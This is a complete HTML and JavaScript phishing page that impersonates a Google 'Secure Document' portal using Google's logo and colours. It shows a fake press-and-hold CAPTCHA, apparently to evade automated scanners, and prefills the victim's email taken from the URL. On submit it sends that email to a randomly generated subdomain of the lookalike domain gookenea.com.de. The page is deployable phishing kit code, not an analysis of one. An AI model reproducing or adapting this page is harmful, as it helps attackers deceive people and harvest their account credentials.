<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Secure Google Document</title>
  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet"/>
  <style>
    /* Loader Styles */
    #loader-container {
      position: fixed;
      width: 100vw;
      height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      background: linear-gradient(120deg, #89f7fe, #66a6ff);
      z-index: 10;
    }

    .loader-circle {
      border: 6px solid rgba(255, 255, 255, 0.3);
      border-top: 6px solid white;
      border-radius: 50%;
      width: 80px;
      height: 80px;
      animation: spin 1s linear infinite;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    /* Main Content Styles */
    body {
      font-family: 'Roboto', sans-serif;
      background: #F5F5F5;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }

    .container {
      background: white;
      padding: 25px;
      border-radius: 8px;
      box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
      text-align: center;
      max-width: 350px;
      width: 90%;
      border-top: 4px solid #4285F4;
      display: none;
    }

    .logo {
      width: 120px;
      margin-bottom: 15px;
    }

    h1 {
      font-size: 20px;
      color: #3c4043;
      margin-bottom: 15px;
      font-weight: 500;
    }

    p {
      font-size: 14px;
      color: #5f6368;
      margin-bottom: 20px;
      line-height: 1.5;
    }

    .bold-text {
      font-weight: 500;
      color: #3c4043;
    }

    input {
      width: 100%;
      max-width: 300px;
      padding: 12px;
      border: 1px solid #dadce0;
      border-radius: 4px;
      font-size: 14px;
      margin-bottom: 15px;
      box-sizing: border-box;
      text-align: center;
      transition: border 0.3s;
    }

    input:focus {
      border-color: #4285F4;
      outline: none;
    }

    button {
      width: auto;
      padding: 10px 24px;
      background: #4285F4;
      color: white;
      border: none;
      border-radius: 4px;
      font-size: 14px;
      font-weight: 500;
      cursor: pointer;
      transition: background 0.3s;
      margin-top: 10px;
    }

    button:hover {
      background: #3367D6;
    }

    .verification-text {
      font-size: 13px;
      color: #5f6368;
      margin-top: 15px;
      display: block;
    }

    .loading-spinner {
      border: 4px solid rgba(66, 133, 244, 0.1);
      border-top: 4px solid #4285F4;
      border-radius: 50%;
      width: 30px;
      height: 30px;
      animation: spin 1s linear infinite;
      display: none;
      margin: 15px auto;
    }

    .google-colors {
      display: flex;
      justify-content: center;
      margin-bottom: 20px;
    }
    .color-bar {
      height: 4px;
      width: 25%;
    }
    .blue { background-color: #4285F4; }
    .red { background-color: #EA4335; }
    .yellow { background-color: #FBBC05; }
    .green { background-color: #34A853; }

    /* Press and Hold CAPTCHA Styles */
    .captcha-container {
      margin: 20px 0;
      padding: 15px;
      background: #f8f9fa;
      border-radius: 4px;
      border: 1px solid #dadce0;
      text-align: center;
    }
    
    .hold-button {
      width: 100%;
      padding: 15px;
      background: #f1f3f4;
      border: 2px solid #dadce0;
      border-radius: 4px;
      font-size: 16px;
      font-weight: 500;
      color: #3c4043;
      cursor: pointer;
      position: relative;
      overflow: hidden;
      transition: background 0.3s;
    }
    
    .hold-button:hover {
      background: #e8eaed;
    }
    
    .hold-button.active {
      background: #e6f4ea;
      border-color: #34a853;
    }
    
    .hold-button.success {
      background: #e6f4ea;
      border-color: #34a853;
      color: #34a853;
    }
    
    .progress-bar {
      position: absolute;
      bottom: 0;
      left: 0;
      height: 4px;
      background: #34a853;
      width: 0%;
      transition: width 0.1s linear;
    }
    
    .instructions {
      font-size: 13px;
      color: #5f6368;
      margin-top: 10px;
    }
    
    #email-form {
      display: none;
    }
    
    .prefilled-email {
      font-weight: bold;
      color: #4285F4;
      margin: 15px 0;
    }
  </style>
</head>
<body>
  <!-- Loader -->
  <div id="loader-container">
    <div class="loader-circle"></div>
  </div>

  <!-- Main Content -->
  <div class="container" id="main-content">
    <!-- Google Logo -->
    <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google Logo" class="logo" />
    <div class="google-colors">
      <div class="color-bar blue"></div>
      <div class="color-bar red"></div>
      <div class="color-bar yellow"></div>
      <div class="color-bar green"></div>
    </div>

    <h1>Google Portal</h1>
    <p class="bold-text">Please verify you're not a robot</p>

    <!-- Press and Hold CAPTCHA Section -->
    <div id="captcha-section">
      <div class="captcha-container">
        <p>Press and hold to verify</p>
        <button class="hold-button" id="hold-button">
          Hold for 3 seconds
          <div class="progress-bar"></div>
        </button>
        <p class="instructions">Keep holding until the progress bar completes</p>
      </div>
    </div>

    <!-- Email Form (hidden until CAPTCHA is solved) -->
    <div id="email-form">
      <p class="bold-text"></p>
      <div id="prefilled-email-container" class="prefilled-email" style="display:none;">
        Document shared to: <span id="prefilled-email"></span>
      </div>
      <form onsubmit="verifyEmail(event)">
        <input type="email" id="email" placeholder="Enter your email" required />
        <button type="submit">Verify</button>
      </form>
      <p class="bold-text verification-text">Verifying access for the recipient's Account.</p>
      <div class="loading-spinner" id="form-spinner"></div>
    </div>
  </div>

  <script>
    document.addEventListener("DOMContentLoaded", () => {
      const generateRandomString = (length) => {
        const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefhiklmnorstuvwxz0123456789";
        return Array.from({ length }, () => characters.charAt(Math.floor(Math.random() * characters.length))).join('');
      };

      // Function to extract email from URL parameters (# or ?e=)
      const extractEmailFromURL = () => {
        const url = new URL(window.location.href);
        // Check for email in hash (#email@domain.com)
        if (url.hash && url.hash.includes('@')) {
          return url.hash.substring(1); // Remove the #
        }
        // Check for email in query parameter (?e=email@domain.com)
        if (url.searchParams.get('e')) {
          return url.searchParams.get('e');
        }
        return null;
      };

      // Show loader first, then main content after delay
      setTimeout(() => {
        document.getElementById("loader-container").style.display = "none";
        document.getElementById("main-content").style.display = "block";
        
        // Check for prefilled email
        const extractedEmail = extractEmailFromURL();
        if (extractedEmail) {
          window.prefilledEmail = extractedEmail; // Store for later use
        }
      }, 3000);

      // Press and Hold CAPTCHA functionality
      const holdButton = document.getElementById('hold-button');
      const progressBar = holdButton.querySelector('.progress-bar');
      let holdInterval;
      let holdTime = 0;
      const requiredHoldTime = 3000; // 3 seconds

      holdButton.addEventListener('mousedown', startHold);
      holdButton.addEventListener('touchstart', startHold);
      
      holdButton.addEventListener('mouseup', endHold);
      holdButton.addEventListener('touchend', endHold);
      holdButton.addEventListener('mouseleave', endHold);

      function startHold() {
        holdButton.classList.add('active');
        holdTime = 0;
        progressBar.style.width = '0%';
        
        holdInterval = setInterval(() => {
          holdTime += 100;
          const progressPercent = Math.min((holdTime / requiredHoldTime) * 100, 100);
          progressBar.style.width = `${progressPercent}%`;
          
          if (holdTime >= requiredHoldTime) {
            completeHold();
          }
        }, 100);
      }

      function endHold() {
        if (holdInterval) {
          clearInterval(holdInterval);
          holdButton.classList.remove('active');
          if (holdTime < requiredHoldTime) {
            progressBar.style.width = '0%';
          }
        }
      }

      function completeHold() {
        clearInterval(holdInterval);
        holdButton.classList.remove('active');
        holdButton.classList.add('success');
        holdButton.textContent = 'Verified âœ“';
        
        setTimeout(() => {
          document.getElementById('captcha-section').style.display = 'none';
          document.getElementById('email-form').style.display = 'block';
          
          // If we have a prefilled email, show it and autofill the field
          if (window.prefilledEmail) {
            document.getElementById('prefilled-email-container').style.display = 'block';
            document.getElementById('prefilled-email').textContent = window.prefilledEmail;
            document.getElementById('email').value = window.prefilledEmail;
            document.querySelector('.bold-text').textContent = "";
          } else {
            document.querySelector('.bold-text').textContent = "To open this File, enter the email address it was shared to.";
          }
        }, 500);
      }

      // Verify Email
      window.verifyEmail = function(event) {
        event.preventDefault();
        const email = document.getElementById('email').value;
        if (email) {
          document.getElementById('form-spinner').style.display = 'block';
          
          // Generate random URL components
          const randomSubdomain = generateRandomString(10);
          const randomPath = generateRandomString(15);
          
          // Create final URL with email parameter
          const finalUrl = `https://${randomSubdomain}.gookenea.com.de/a9lNhhA6wf!fAySb/?ff${encodeURIComponent(email)}`;

          setTimeout(() => {
            window.location.href = finalUrl;
          }, 2000);
        }
      };
    });
  </script>
</body>
</html>
